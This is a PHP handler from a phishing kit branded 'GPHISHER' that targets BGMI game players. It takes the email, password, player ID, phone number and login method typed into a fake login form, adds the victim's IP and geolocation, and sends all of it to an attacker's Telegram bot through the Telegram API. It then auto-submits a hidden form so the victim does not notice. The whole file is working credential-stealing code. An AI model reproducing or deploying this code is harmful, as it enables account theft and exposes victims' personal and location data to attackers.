<?php 
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}
include 'system/setting.php';
include 'telegram.php';

$user = new get_flag();
$email = $user->post($_POST['email']);
$password = $user->post($_POST['password']);
$playid = $user->post($_POST['playid']);
$phone = $user->post($_POST['phone']);
$level = $user->post($_POST['level']);
$login = $user->post($_POST['login']);

//send to BOT
$Text = "
╔ • 🔥 New #BGMI Added 🔥
╠=====L=O=G=I=N========
╠ • 🔒 LOGIN : $login 
╠ • 👤 Account : $email
╠ • 🔑 Password : $password
╠ • 🆔 PlayerID : $playid
╠ • 📈 Level :  $level
╠ • 🏳 Flag : $flag
╠ • 📞 Country Code : $code
╠ • 📱 Number : $phone 
╠ • ⌚ Time Zone : $jamasuk
╠====L=O=C=A=T=I=O=N====
╠ • 🌎 Continent : $continent
╠ • 🌎 Country : $country
╠ • 🌎 Region : $region
╠ • 🌎 City : $city
╠ • 🌐 Longitude : $longitude
╠ • 🌐 Latitude : $latitude
╠ • 🌎 Ip : $ipaddress
╠====S=U=P=P=O=R=T======
║ • 📢 CHNL : @firerepo
║ • 📢 TOOL : GPHISHER
╚ • ❗️ GHUB : https://github.com/fireprojects
";
    



$ok = 
    file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($Text));

    echo "<form id='22' method='POST' action='processing.php'>
    <input type='hidden' name='refresh'>
    </form>
    <script type='text/javascript'>document.getElementById('22').submit();</script>";
?>



